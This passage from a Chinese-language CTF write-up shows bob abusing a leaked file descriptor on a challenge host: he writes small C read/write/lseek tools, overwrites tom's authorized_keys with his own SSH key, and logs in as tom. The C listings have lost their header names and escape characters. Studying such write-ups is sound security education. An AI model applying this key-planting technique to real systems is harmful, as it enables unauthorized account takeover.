    bob@challenge:~$ ls -l /proc/self/fd
    total 0
    lrwx------ 1 bob bob 64 Apr 12 12:26 0 -> /dev/pts/1
    lrwx------ 1 bob bob 64 Apr 12 12:26 1 -> /dev/pts/1
    lrwx------ 1 bob bob 64 Apr 12 12:26 2 -> /dev/pts/1
    lrwx------ 1 bob bob 64 Apr 12 12:26 3 -> /home/tom/.ssh/authorized_keys
    lr-x------ 1 bob bob 64 Apr 12 12:26 4 -> /proc/54947/fd
所以我们只能“echo key >
/proc/self/fd/3”？不是，那只是个符号链接，一个指向不存在的文件的符号链接。它指向的是一个我们没有权限创建文件的地方。让我们确认一下？
    bob@challenge:~$ ls -l /home/tom/.ssh/authorized_keys
    -rw------- 1 tom bob 15 Apr 12 12:25 /home/tom/.ssh/authorized_keys
    bob@challenge:~$ id
    uid=1001(bob) gid=1001(bob) groups=1001(bob)
    bob@challenge:~$ echo > /home/tom/.ssh/authorized_keys
    bash: /home/tom/.ssh/authorized_keys: Permission denied
    bob@challenge:~$ echo > /tmp/tmpfile
    bash: /tmp/tmpfile: Permission denied
    bob@challenge:~$ echo > /proc/self/fd/3
    bash: /proc/self/fd/3: Permission denied
我们需要写入文件描述符3…那么，是否有CAT版本支持文件描述符呢？就我所知没有，让我们编写一些小实用程序来帮助我们掌握对继承文件句柄的访问。我们将编写3个工具：
  * read-使用读函数从特定的文件描述符读取一组字节数。
  * write-将我们选择的字符串写入特定的文件描述符。
  * lseek-这样我们就可以知道读/写的位置
下面是(非常简单的)演示的代码：
    bob@challenge:~$ cat read.c
    #include 
    #include 
    #include 
    #include 
    int main(int argc, char *argv[]) {
     char buf[1024];
     memset(buf, 0, 1024);
     int r = read(atoi(argv[1]), buf, 10);
     printf("Read %d bytesn", r);
     write(1, buf, 10);
    }
    bob@challenge:~$ gcc -o read read.c
    bob@challenge:~$ cat write.c
    #include 
    #include 
    #include 
    #include 
    int main(int argc, char *argv[]) {
     printf("writing %s to fd %sn", argv[2], argv[1]);
     write(atoi(argv[1]), argv[2], strlen(argv[2]));
    }
    bob@challenge:~$ gcc -o write write.c
    bob@challenge:~$ cat lseek.c
    #include 
    #include 
    #include 
    #include 
    #include 
    int main(int argc, char *argv[]) {
     printf("seek to position %s on fd %sn", argv[2], argv[1]);
     lseek(atoi(argv[1]), atoi(argv[2]), SEEK_SET);
    }
    bob@challenge:~$ gcc -o lseek lseek.c
先看看这些工具的作用。首先，我们尝试读取，然后写入文件描述符3，但是读取总是返回0字节：
    bob@challenge:~$ ./read 3
    Read 0 bytes
    bob@challenge:~$ ./write 3 hello
    writing hello to fd 3
    bob@challenge:~$ ./read 3
    Read 0 bytes
原因是我们需要在文件中查找一个不是文件末尾的位置。让我们查找位置0，即文件的开头：
    bob@challenge:~$ ./lseek 3 0
    seek to position 0 on fd 3
    bob@challenge:~$ ./read 3
    Read 10 bytes
    pointless bob@challenge:~$ ./read 3
    Read 10 bytes
    data
    hellobob@challenge:~$ ./read 3
    Read 0 bytes
现在好多了。
最后，我们需要利用上述程序。我们有两个选择：
  * 像以前一样运行shell，然后使用我们的新工具将密钥写入授权键；或者，
  * 使用上面的函数来编写一个新的工具来写入授权的键。
我们选择前者。大家可以试试后者作为练习。请注意，在写入数据之前，我们需要寻找位置0。重要的一点是要覆盖已经存在的“pointless”消息，因为它破坏了authorized_keys文件：
    bob@challenge:~$ ssh-keygen
    Generating public/private rsa key pair.
    Enter file in which to save the key (/home/bob/.ssh/id_rsa): bobkey
    Enter passphrase (empty for no passphrase):
    Enter same passphrase again:
    Your identification has been saved in bobkey.
    Your public key has been saved in bobkey.pub.
    bob@challenge:~$ cat bobkey.pub
    ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2PezJjFSI778OvONA5aqfM2Y2d0eYizOkcqTimy7dXfaEhSKnRSRyfwOfwOOaVpLdZW9NmfaPd5G8RY3n+3QwDIPv4Aw5oV+5Q3C3FRG0oZoe0NqvcDN8NeXZFbzvcWqrnckKDmm4gPMzV1rxMaRfFpwjhedyai9iw5GtFOshGZyCHBroJTH5KQDO9mow8ZxFKzgt5XwrfMzvBd+Mf7kE/QtD40CeoNP+GsvNZESxMC3pWfjZet0p7Jl1PpW9zAdN7zaQPH2l+GHzvgPuZDgn+zLJ4CB69kGkibEeu1c1T80dqDDL1DkN1+Kbmop9/5gzOYsEmvlA4DQC6nO9NCTb bob@challenge
    bob@challenge:~$ ls -l bobkey.pub
    -rw-r--r-- 1 bob bob 387 Apr 12 12:30 bobkey.pub
    bob@challenge:~$ ./lseek 3 0
    seek to position 0 on fd 3
    bob@challenge:~$ ./write 3 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2PezJjFSI778OvONA5aqfM2Y2d0eYizOkcqTimy7dXfaEhSKnRSRyfwOfwOOaVpLdZW9NmfaPd5G8RY3n+3QwDIPv4Aw5oV+5Q3C3FRG0oZoe0NqvcDN8NeXZFbzvcWqrnckKDmm4gPMzV1rxMaRfFpwjhedyai9iw5GtFOshGZyCHBroJTH5KQDO9mow8ZxFKzgt5XwrfMzvBd+Mf7kE/QtD40CeoNP+GsvNZESxMC3pWfjZet0p7Jl1PpW9zAdN7zaQPH2l+GHzvgPuZDgn+zLJ4CB69kGkibEeu1c1T80dqDDL1DkN1+Kbmop9/5gzOYsEmvlA4DQC6nO9NCTb bob@challenge'
     writing ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2PezJjFSI778OvONA5aqfM2Y2d0eYizOkcqTimy7dXfaEhSKnRSRyfwOfwOOaVpLdZW9NmfaPd5G8RY3n+3QwDIPv4Aw5oV+5Q3C3FRG0oZoe0NqvcDN8NeXZFbzvcWqrnckKDmm4gPMzV1rxMaRfFpwjhedyai9iw5GtFOshGZyCHBroJTH5KQDO9mow8ZxFKzgt5XwrfMzvBd+Mf7kE/QtD40CeoNP+GsvNZESxMC3pWfjZet0p7Jl1PpW9zAdN7zaQPH2l+GHzvgPuZDgn+zLJ4CB69kGkibEeu1c1T80dqDDL1DkN1+Kbmop9/5gzOYsEmvlA4DQC6nO9NCTb bob@challenge to fd 3
###  步骤3：通过SSH登录
    bob@challenge:~$ ssh -i bobkey tom@localhost
    $ id
    uid=1002(tom) gid=1002(tom) groups=1002(tom)
我们完成了。我们利用泄露的文件描述符将我们选择的数据写入目标用户（在本例是tom）的authorized_keys文件。在这个过程中，我们使用了一种有点不切实际的符号链接攻击，但这并不会使我们关于如何使用和滥用泄漏的文件描述符的讨论无效。
## 结论
黑客挑战很有趣。即使是你不小心找到了一个更难的解决方案，并且浪费的时间比需要的长10倍。
编写安全的setUID程序可能很困难，特别是在生成子进程时，或者在其他用户可写的目录中使用open()时。 users.
fs.protected_symlinks为设置了粘滞位(sticky bit)的文件夹提供了一些缓解措施。
审核人：yiwang 编辑：边边